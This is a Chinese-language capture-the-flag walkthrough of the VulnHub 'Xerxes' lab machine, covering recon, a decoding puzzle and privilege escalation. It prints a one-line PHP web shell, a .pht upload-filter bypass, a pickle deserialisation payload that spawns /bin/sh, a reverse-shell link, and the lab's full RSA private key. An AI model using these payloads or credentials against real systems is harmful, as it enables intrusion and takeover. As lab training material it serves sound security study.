# 下载地址

    
    
    https://download.vulnhub.com/xerxes/xerxes.tar.gz
    

# **实战演练**

使用netdiscover命令查找靶机的IP

![image.png](https://image.3001.net/images/20190806/1565063448_5d48f9184831b.png)  

使用nmap查看靶机开放的端口

![image.png](https://image.3001.net/images/20190806/1565063645_5d48f9ddaf522.png)在浏览器打开http服务，首页没东西

![image.png](https://image.3001.net/images/20190806/1565063808_5d48fa8087d41.png)查看页面源代码，也没有发现任何东西

![image.png](https://image.3001.net/images/20190806/1565063840_5d48faa02b0e7.png)爆破目录

![image.png](https://image.3001.net/images/20190806/1565063896_5d48fad8deeb4.png)有一个上传目录

![image.png](https://image.3001.net/images/20190806/1565063945_5d48fb09b15b8.png)上传一个图片试试，要输入正确密码才可以上传

![image.png](https://image.3001.net/images/20190806/1565064087_5d48fb9734339.png)在这个页面没有找到其他可用的信息，去看看其他路径，有一个forget的页面

![image.png](https://image.3001.net/images/20190806/1565064181_5d48fbf59b1ec.png)  

百度二维码识别，看看这个图片有什么信息，解码是一个base64加密的字符串

![image.png](https://image.3001.net/images/20190806/1565064281_5d48fc595e624.png)![image.png](https://image.3001.net/images/20190806/1565065120_5d48ffa090d7c.png)  

  

提示是看的更深？？？于是，我就放大图片20倍，看到了这个东西![image.png](https://image.3001.net/images/20190806/1565065690_5d4901da0d3b2.png)

我这里使用Gimp Editor进行编辑查看

![image.png](https://image.3001.net/images/20190806/1565066375_5d490487c2c27.png)然后按着shift点击颜色

![image.png](https://image.3001.net/images/20190806/1565066443_5d4904cb16e52.png)![image.png](https://image.3001.net/images/20190806/1565066455_5d4904d71da3d.png)最后的结果是

    
    
    75,121,115,114,75,121,115,114,87,122,52,114,75,121,115,114,75,121,115,114,75,122,119,116,88,84,52,114,75,121,115,114,76,105,115,117,76,83,48,116,76,83,52,116,76,105,52,61

写个脚本翻译一下

    
    
    s = "75,121,115,114,75,121,115,114,87,122,52,114,75,121,115,114,75,121,115,114,75,122,119,116,88,84,52,114,75,121,115,114,76,105,115,117,76,83,48,116,76,83,52,116,76,105,52,61"t = ""for i in s.split(','):
        t = t+chr(int(i))
    print(t)
    
    
    结果：
    KysrKysrWz4rKysrKysrKzwtXT4rKysrLisuLS0tLS4tLi4=

这是base64，继续翻译，这是什么鬼东西来的？？？google一下，这是一种Brainfuck脚本，解码的[网站](https://www.splitbrain.org/services/ook)

![image.png](https://image.3001.net/images/20190806/1565067755_5d4909eb7c051.png)  

最后解析为45100

![image.png](https://image.3001.net/images/20190806/1565067862_5d490a5614698.png)之后我们尝试上传txt文件进行上传并成功上传。现在我们尝试在服务器上传一个php文件，但我们不能。所以我们知道它是Debian服务器。然后我们用Google搜索Debian
Apache配置文件。在研究了配置文件之后，我们发现如果我们上传一个带有pht扩展名的php文件，那么我们将把这个pht文件作为php文件执行。我们尝试通过更改扩展名来上传php文件，并且工作正常。  

[反弹shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

![image.png](https://image.3001.net/images/20190806/1565068131_5d490b63d62c0.png)

文件太大了，上传不了，那就用小马把  
![image.png](https://image.3001.net/images/20190806/1565068131_5d490b63d62c0.png)小马

    
    
    <?php
    system($_REQUEST['cmd']);
    ?>

成功执行

![image.png](https://image.3001.net/images/20190806/1565068339_5d490c33f16a1.png)使用nc反弹

![image.png](https://image.3001.net/images/20190806/1565068408_5d490c7871d41.png)![image.png](https://image.3001.net/images/20190806/1565068419_5d490c83f1cd0.png)  

现在让我们通过执行以下命令检查主目录以及有多少用户：ls -lart /home

![image.png](https://image.3001.net/images/20190806/1565068525_5d490ced8a88a.png)  

正如我们在上图中看到的，目前该系统中有三个用户：amanpour，curtiz和delacroix，但除了amanpour之外，我们没有所有用户的权限。  

进入这个目录

![image.png](https://image.3001.net/images/20190806/1565068581_5d490d25db88c.png)查看历史命令

![image.png](https://image.3001.net/images/20190806/1565068680_5d490d8874d43.png)这个脚本可以重置密码

![image.png](https://image.3001.net/images/20190806/1565068787_5d490df39ffa3.png)使用ssh登录这个账号

![image.png](https://image.3001.net/images/20190806/1565068886_5d490e56f2298.png)  

首先，我们通过输入 find / -perm -4000 -type f 2>/dev/null 开始查找所有SUID文件

SUID是赋予文件的特殊类型的文件权限。通常在Linux/Unix中运行程序时，它会从登录用户继承访问权限。SUID定义为为用户提供临时权限，以使用文件所有者的权限而不是运行它的用户来运行程序/文件。简单来说，用户在执行文件/程序/命令时将获得文件所有者的权限以及所有者UID和GID。

找到一个目录有点意思

![image.png](https://image.3001.net/images/20190806/1565069031_5d490ee78ae16.png)进入notes目录

![image.png](https://image.3001.net/images/20190806/1565079930_5d49397ad7775.png)  

查看代码，可以发现它使用了pickle

![image.png](https://image.3001.net/images/20190806/1565079895_5d49395749278.png)pickle的作用是在将对象写入文件之前先将其“序列化”，于是我找到了它的[shellcode](https://checkoway.net/musings/pickle/)，新建一个文件，往里面写入shellcode

    
    
    cos
    system
    (S'/bin/sh'
    tR.

更换成其他用户

![image.png](https://image.3001.net/images/20190806/1565080210_5d493a92be1d0.png)

进入该用户的主目录，这个是marie的ssh私钥  
![image.png](https://image.3001.net/images/20190806/1565080499_5d493bb30ac9b.png!small)在passwd文件找到该用户，发现它有个执行文件，很异常，查看找到一个MD5`3d054afb77714ca938d8bca104fcb141`

![image.png](https://image.3001.net/images/20190806/1565080613_5d493c258fe07.png)

解密MD5

![image.png](https://image.3001.net/images/20190806/1565080686_5d493c6e88915.png)使用私钥进行登录

    
    
    $ cat id_rsa
    -----BEGIN RSA PRIVATE KEY-----    MIIEowIBAAKCAQEAoRCJPJ0sIabJxmC0cbR1ppci3FFh5GBCVV/BYNnU9UKnOJyn
    CtKCZDd+RAZiNxrN37eh486uyBdbHu8UVcDaPDrge3XHrrHQn41za1I1eXYQ3dhV
    mSY8kLkqmXMYutTwPxB4Eav0KMbdmsg+frSEU1TDiIhEVG7/h5wQTpdWRMVRKDFb
    lrwm0yFV9a/Ib1+qB4AMUC9VFvAvqhMJfF2ZrYXcni1X+QRbGdr94seEYCg369lD
    XEcHhkAhf+LrU99bCsTXa5d6TMKhFrDegLd5Mb8VCAgZFUAStpYTbAfazwBN4eux
    9Q62opjNaNUN1XXpTD8hU4Q56YN0lNd/5rJRYQIDAQABAoIBABrcmSbEx8FtAaXW
    JwH3qM950VSRNhRSgX2flK7EZaHp1d25Mpq5dQmlv6c0sVijXcZ758IIjFnOm2HT
    Wb7bhQoaf6nXgM//091oR+GUOlrhd/qnw87g86TnXNVuvqcaMF80LfI0jWnnkLnp
    v5J+JLuJHXs9zreOM4u4WXfiAX9CbXrcwFoHEh7io0s1WmrA/DGJJLD50O6/GkN+
    QSvnU77JTb+1HOtXpN9T6x0tz/BEr3ahjYbzpqg+MPIuZUCU9uTK0Hfb+NPvd6sr
    bdjYGCKu6FPiYMgZ11WMGDWzI/Uiu8URtKmGe0e0x/Wlny6D/f21hlwO0XNOy2Pq
    ZeSj/WECgYEA0j6G6ah6onC6bcWOlnj7RRLV0Hv8TSdPoIA/ZUvAiZUsAqp9So+H
    Ne60/HZXIVFV+BkiZff86cYqvqRdg4UZ3pSAvxFhR97Xf3P84qe2cg1l3NPbhWkT
    Dp9XaP6sXFZ+eyKDTO9VkNbXRKIzZOzYqAmyqyZEqtRm5ZB1auBGvhUCgYEAxB4I
    Do6paaNDNT/Onmccm5wlbUr7kgSEweGI9QnEv2GK+kwPsTaagtU4B6zHxVVyXemk
    04r0ZtQo2GEWZkkrJiKQO7QYG3prNf9hd+4Jw8NDpdiUFeLr3q1YS3rpEDHN1EBV
    YebflltIf5Wkl27LJlT4Mz9BZbd3L0CVAWuO5R0CgYA/TPwp1cQ2rGI1MsofnAVr
    YqRlxS7NvAxJctOjmA88XWGG2/YlQNmg72ImsSrCqU6NCGRG90d6y2OLSsmtE6Ia
    VfP9kyoLDZkskquNQpm39Ti6KD9sB5rpSCh1QFh85L3oLRgDTfwhQ85Ep+F5faYt
    0d2tkjQSiyj/7WKs7yHdkQKBgQCpGe/+hVpkgObJelwxT11me6v14iqrDARgnJSY
    HLUuA/Buw7jgJ+Hwn+LxEzUp3PSBL5303aLBK3yQnp5O0hZHipPtNut2fgcFh0/G
    tlRrHOoujWGawZB57+PrKW7ejOMaeeJlSUpO/iS0BhbmkBzQz4E3xvoft6Mn9jrE
    /7Y1rQKBgAefUP+D3pt4EZa37RS6FdbTyHyFpYlzK8SVrnyt+ELn8MU4PJj72Yq4
    f2sTKGrC2DFXmNxhdJGAJw1vChET1aVU+QxJxckF/h4gJKsbfKuoSECb4Ojomh9o
    SeNEL6zyLP7mMLFvGnpc63pOTuDgQr954JMW4P2F5ekku2Ea5DMX
    -----END RSA PRIVATE KEY-----      
    

登录成功

![image.png](https://image.3001.net/images/20190806/1565081941_5d494155eb19a.png)查看目录，我们在check.sh文件的源代码中看到了什么？它在登录时回显问候消息，并且脚本检查自创建文件/home/delacroix/.last以来的秒数。如果它超过86400秒（24小时），它会提示Marie使用generate.sh更改密码，generate.sh会创建一个新的.last文件，并使用该文件的HH：MM时间戳生成唯一的MD5。

![image.png](https://image.3001.net/images/20190806/1565082052_5d4941c47279d.png)现在，我们将使用stat命令检查所有文件的状态，以及用户在创建该文件后上次登录或注销时的状态。所以输入stat
.last  

![image.png](https://image.3001.net/images/20190806/1565082576_5d4943d0bfa71.png)现在我们可以看到确切的访问时间是00:19:51。因此，考虑到这一点，我们现在可以提取generate.sh的相关部分并计算它在上次运行脚本时为Marie提供的MD5。所以我们输入`echo
00:19:51 | md5sum | awk {'print $1'}`  

![image.png](https://image.3001.net/images/20190806/1565082691_5d494443c5545.png)flag是个图片

![image.png](https://image.3001.net/images/20190806/1565082798_5d4944ae2f1a5.png)![image.png](https://image.3001.net/images/20190806/1565083354_5d4946da17a34.png)  

